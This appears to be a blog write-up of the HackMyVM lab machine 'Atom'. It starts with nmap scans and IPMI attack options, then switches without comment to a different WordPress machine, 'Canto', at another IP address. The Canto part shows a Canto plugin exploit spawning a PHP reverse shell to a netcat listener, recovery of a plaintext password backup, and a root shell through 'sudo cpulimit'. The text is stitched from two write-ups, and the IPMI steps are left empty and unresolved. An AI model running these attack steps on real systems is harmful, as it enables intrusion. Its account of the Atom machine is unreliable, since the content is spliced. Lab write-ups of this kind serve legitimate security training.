---
layout: post
title: Write-Up HMV Atom
date: 2024-09-07 15:54 +0200
tags:
- post
- proxmox
- VM
- HackMyVM
- Write-up
- nmap
- IPMI
categories: Write-up, OffSec,
author: strambb
pin: false
date: 2024-08-25 12:50 +0200
media_subpath: "/assets/images/"
---


<iframe src="https://hackmyvm.eu/machines/vmcard.php?vm=Atom" frameborder="0" width="600" height="600"></iframe>


# Introduction
In this write-up I will show how to obtain root access in the Atom VM by [rpj7](https://hackmyvm.eu/profile/?user=rpj7)

The VM was setup in my isolated network on Proxmox. If you  want to do it the same way, you can find my guide here: [Setup Virtual Box in Proxmox]({% post_url 2024-08-20-setting-up-virtual-boxes-on-proxmox %})

Basics:
- IP 
  - 10.10.99.13

# First Enumeration with Nmap
As always lets enumerate the VM to see what ports are open, which OS is used and which services are active:


```bash
sudo nmap -sV -A -T4 -Pn -p- -oN atom_scan_fast.txt -vv 10.10.99.13
```


Well, the results are quite uninteresting: Despite ssh, no active service...
And most probably ssh will not be the main entry point.
The unspecified Nmap scan is a TCP scan and normally does not scan UDP. Let's see if there is something to find with UDP.

```bash
# Using the -sU flag to initiate a UDP scan
# Also limiting to top 100 ports as UDP scans take a lot longer

sudo nmap -sV -sU -T4 -Pn -top-port 1000 -oN atom_scan_fast_UDP.txt -vv 10.10.99.13

```

The results are:

```bash
──(c0xwl㉿kali)-[~/Downloads]
└─$ sudo nmap -sU -T4 -Pn -top-port 100 -oN atom_scan_fast_UDP.txt -vv 10.10.99.13 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 10:46 EDT
Initiating Parallel DNS resolution of 1 host. at 10:46
Completed Parallel DNS resolution of 1 host. at 10:46, 0.00s elapsed
Initiating UDP Scan at 10:46
Scanning atom.cyber.range (10.10.99.13) [100 ports]
Increasing send delay for 10.10.99.13 from 0 to 50 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.99.13 from 50 to 100 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.99.13 from 100 to 200 due to 11 out of 12 dropped probes since last increase.
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.86% done; ETC: 10:46 (0:00:03 remaining)
Increasing send delay for 10.10.99.13 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Discovered open port 623/udp on 10.10.99.13
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 10:47 (0:00:00 remaining)
Increasing send delay for 10.10.99.13 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Completed UDP Scan at 10:47, 52.45s elapsed (100 total ports)
Nmap scan report for atom.cyber.range (10.10.99.13)
Host is up, received user-set (0.00082s latency).
Scanned at 2024-09-07 10:46:18 EDT for 53s

PORT      STATE         SERVICE         REASON
7/udp     open|filtered echo            no-response
9/udp     closed        discard         port-unreach ttl 63
17/udp    closed        qotd            port-unreach ttl 63
19/udp    closed        chargen         port-unreach ttl 63
49/udp    closed        tacacs          port-unreach ttl 63
53/udp    closed        domain          port-unreach ttl 63
67/udp    open|filtered dhcps           no-response
68/udp    open|filtered dhcpc           no-response
69/udp    open|filtered tftp            no-response
80/udp    closed        http            port-unreach ttl 63
88/udp    closed        kerberos-sec    port-unreach ttl 63
111/udp   open|filtered rpcbind         no-response
120/udp   closed        cfdptkt         port-unreach ttl 63
123/udp   open|filtered ntp             no-response
135/udp   open|filtered msrpc           no-response
136/udp   closed        profile         port-unreach ttl 63
137/udp   closed        netbios-ns      port-unreach ttl 63
138/udp   closed        netbios-dgm     port-unreach ttl 63
139/udp   open|filtered netbios-ssn     no-response
158/udp   closed        pcmail-srv      port-unreach ttl 63
161/udp   open|filtered snmp            no-response
162/udp   open|filtered snmptrap        no-response
177/udp   closed        xdmcp           port-unreach ttl 63
427/udp   closed        svrloc          port-unreach ttl 63
443/udp   open|filtered https           no-response
445/udp   open|filtered microsoft-ds    no-response
497/udp   closed        retrospect      port-unreach ttl 63
500/udp   closed        isakmp          port-unreach ttl 63
514/udp   open|filtered syslog          no-response
515/udp   closed        printer         port-unreach ttl 63
518/udp   closed        ntalk           port-unreach ttl 63
520/udp   closed        route           port-unreach ttl 63
593/udp   open|filtered http-rpc-epmap  no-response
#################### Here is a open port ##################
623/udp   open          asf-rmcp        udp-response ttl 62
###########################################################
626/udp   open|filtered serialnumberd   no-response
631/udp   closed        ipp             port-unreach ttl 63
996/udp   closed        vsinet          port-unreach ttl 63
997/udp   open|filtered maitrd          no-response
998/udp   closed        puparp          port-unreach ttl 63
999/udp   closed        applix          port-unreach ttl 63
1022/udp  open|filtered exp2            no-response
1023/udp  closed        unknown         port-unreach ttl 63
1025/udp  closed        blackjack       port-unreach ttl 63
1026/udp  closed        win-rpc         port-unreach ttl 63
1027/udp  open|filtered unknown         no-response
1028/udp  closed        ms-lsa          port-unreach ttl 63
1029/udp  closed        solid-mux       port-unreach ttl 63
1030/udp  open|filtered iad1            no-response
1433/udp  closed        ms-sql-s        port-unreach ttl 63
1434/udp  closed        ms-sql-m        port-unreach ttl 63
1645/udp  open|filtered radius          no-response
1646/udp  closed        radacct         port-unreach ttl 63
1701/udp  closed        L2TP            port-unreach ttl 63
1718/udp  open|filtered h225gatedisc    no-response
1719/udp  open|filtered h323gatestat    no-response
1812/udp  closed        radius          port-unreach ttl 63
1813/udp  open|filtered radacct         no-response
1900/udp  open|filtered upnp            no-response
2000/udp  closed        cisco-sccp      port-unreach ttl 63
2048/udp  open|filtered dls-monitor     no-response
2049/udp  closed        nfs             port-unreach ttl 63
2222/udp  closed        msantipiracy    port-unreach ttl 63
2223/udp  open|filtered rockwell-csp2   no-response
3283/udp  closed        netassistant    port-unreach ttl 63
3456/udp  open|filtered IISrpc-or-vat   no-response
3703/udp  closed        adobeserver-3   port-unreach ttl 63
4444/udp  open|filtered krb524          no-response
4500/udp  open|filtered nat-t-ike       no-response
5000/udp  closed        upnp            port-unreach ttl 63
5060/udp  closed        sip             port-unreach ttl 63
5353/udp  closed        zeroconf        port-unreach ttl 63
5632/udp  closed        pcanywherestat  port-unreach ttl 63
9200/udp  closed        wap-wsp         port-unreach ttl 63
10000/udp open|filtered ndmp            no-response
17185/udp closed        wdbrpc          port-unreach ttl 63
20031/udp closed        bakbonenetvault port-unreach ttl 63
30718/udp open|filtered unknown         no-response
31337/udp closed        BackOrifice     port-unreach ttl 63
32768/udp closed        omad            port-unreach ttl 63
32769/udp closed        filenet-rpc     port-unreach ttl 63
32771/udp closed        sometimes-rpc6  port-unreach ttl 63
32815/udp open|filtered unknown         no-response
33281/udp closed        unknown         port-unreach ttl 63
49152/udp closed        unknown         port-unreach ttl 63
49153/udp open|filtered unknown         no-response
49154/udp closed        unknown         port-unreach ttl 63
49156/udp open|filtered unknown         no-response
49181/udp open|filtered unknown         no-response
49182/udp open|filtered unknown         no-response
49185/udp open|filtered unknown         no-response
49186/udp closed        unknown         port-unreach ttl 63
49188/udp closed        unknown         port-unreach ttl 63
49190/udp closed        unknown         port-unreach ttl 63
49191/udp open|filtered unknown         no-response
49192/udp open|filtered unknown         no-response
49193/udp open|filtered unknown         no-response
49194/udp open|filtered unknown         no-response
49200/udp closed        unknown         port-unreach ttl 63
49201/udp open|filtered unknown         no-response
65024/udp closed        unknown         port-unreach ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 52.55 seconds
           Raw packets sent: 609 (37.116KB) | Rcvd: 60 (4.896KB)

```

The UDP scan reveals one open port in the top 100 which is `623`
Searching for the service running on 623 reveals IPMI, the 
"Intelligent Platform Management Interface" which is used for so-called "Lights-out" Management of servers. 

More information can be found here: [IPMI](https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface)


Using the world wide web to determine how to exploit IPMI leads us to [IPMI on Hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi) with provides the following suggenstions for exploitation:

- IPMI Authentication Bypass via Cipher 0
  - allows to login with any password given a valid user
- IPMI 2.0 RAKP Authentication Remote Password Hash retrieval
  - retrieval of salted hashes (MD5 and SHA1) of valid users
- IPMI Anonymous Authentication
  - Login w/o blank credentials

Additionally, there a several Manufacturare specific exploits available


Starting with the first one, let see if the target is vulnerable. To do so, we could use metasploit with

```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
or simply trying to login using ipmitool

```bash


```



# Searching the obvious -> Exploits

Let's see if there are any known exploits for the services.

```bash
searchsploit wordpress 6.5.3
searchsploit apache 2.4.57
```

Exploits are only available for certain wordpress plugins but the apache instance looks good
![Screenshot of the searchploit output](image5.png)

![Alt text](apache_exploits.png)



# Taking a look around

Let's walk the application.

Basically the website only consist of a initial webpage, multiple button without a function. No interaction possible.

![Initial website](canto_index.png)

Given the title "Canto" searchsploit may provide results based on the theme/plugin.

```bash
searchsploit canto
```
...reveals...

```bash
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF  | multiple/webapps/49189.txt
Wordpress Plugin Canto < 3.0.5 - Remote Fi | php/webapps/51826.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The third exploit looks promising.

Alright then let's go into fuzzing for subdirectories

# Subdirectory Enumeration 

I'm using gobuster to enumerate the subdirectories

```bash
gobuster dir -u 10.10.99.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,js
```

With this large wordlist, fuzzing takes a while but several results were provided.
The found subdomains are:

- /wp-content/
- /index.php
- /wp-includes/
- /wp-admin/ -> admin login
- /wp-login.php
- /readme.html
- /wp-trackback.php

With access to the admin area we may be able to exploit the web application. 


# Exploiting Canto

To exploit Canto we run the exploit python script 51826.py after starting a netcat listener first

```bash
# Starting the listener
nc -lnvp 4444

# Running the exploit with php-reverse-shell

python3 51826.py -u http://10.10.99.12 -LHOST 10.10.0.10 -s php-reverse-shell.php
```
**We have a shell!!!**

```bash
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 19:11:40 up 10 min,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

# Look around

First checking the home dirs we found "erik" 

```bash
$ pwd
/home/erik
$ ls -la
total 36
drwxr-xr-- 5 erik www-data 4096 May 12 13:56 .
drwxr-xr-x 3 root root     4096 May 12 14:24 ..
lrwxrwxrwx 1 root root        9 May 12 13:56 .bash_history -> /dev/null
-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
drwx------ 2 erik erik     4096 May 12 12:21 .cache
drwxrwxr-x 3 erik erik     4096 May 12 12:03 .local
-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
drwxrwxr-x 2 erik erik     4096 May 12 17:22 notes
-rw-r----- 1 root erik       33 May 12 12:22 user.txt
```

We can see that we have no access to the user.txt which is most probably the user flag...
Let's check out the notes:

```bash
$ cd notes
$ ls 
Day1.txt
Day2.txt
$ cat Day1.txt
On the first day I have updated some plugins and the website theme.
$ cat Day2.txt
I almost lost the database with my user so I created a backups folder.
```

Alright, where might the backups be? Let's find out by googling the default place where wordpress stored DB backups.

Result: Mostly in the wordpress root directory which is /var/wordpress...

Let's check out /var/wordpress for that

```bash
$ cd /var/wordpress
$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 12 17:14 .
drwxr-xr-x 15 root root 4096 May 12 17:14 ..
drwxr-xr-x  2 root root 4096 May 12 17:15 backups
$ cd backups
$ ls -la
total 12
drwxr-xr-x 2 root root 4096 May 12 17:15 .
drwxr-xr-x 3 root root 4096 May 12 17:14 ..
-rw-r--r-- 1 root root  185 May 12 17:14 12052024.txt
$ cat 12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | (SPOILER PROTECTION) |
------------------------------------
$ 
```

**We have the user's password!!!**

# Log in and check out the user's land

Using ssh to log into eriks account

```bash
$ ssh erik@10.10.99.12                  
erik@10.10.99.12's password: 
Welcome to Ubuntu 23.10 (GNU/Linux 6.5.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Aug 27 07:37:37 PM UTC 2024

  System load:  0.07              Processes:              113
  Usage of /:   48.4% of 8.02GB   Users logged in:        0
  Memory usage: 15%               IPv4 address for ens18: 10.10.99.12
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Mon Aug 26 20:42:58 2024 from 10.10.0.10
```

# User Flag

Lets find the user flag for submission.

```bash
erik@canto:~$ pwd
/home/erik
erik@canto:~$ cat user.txt 
SPOILER_PROTECTION
erik@canto:~$ 

```

**We have the user flag!**

# Escalating Privileges
Now with a password we can see if we have sudo permissions somewhere

```bash
sudo -l
```
which results in 

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
```

Nice, we can run cpulimit. 
Let's see if we can exploit the sudo capabilities. I'm using [gtfobins](https://gtfobins.github.io/#) for this.

![Alt text](Screenshot_20240827_154215.png)


Using the sudo option to escalate to root via sudo

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 1223 detected
# whoami
root
#   
```


**We have Root!!!**

# Getting the root flag

Now let's find the root flat. Most probably in a root-only dir like /root

```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
SPOILER_PROTECTION
# 
```

**We have the root flag**

That's it, we're done! 

# END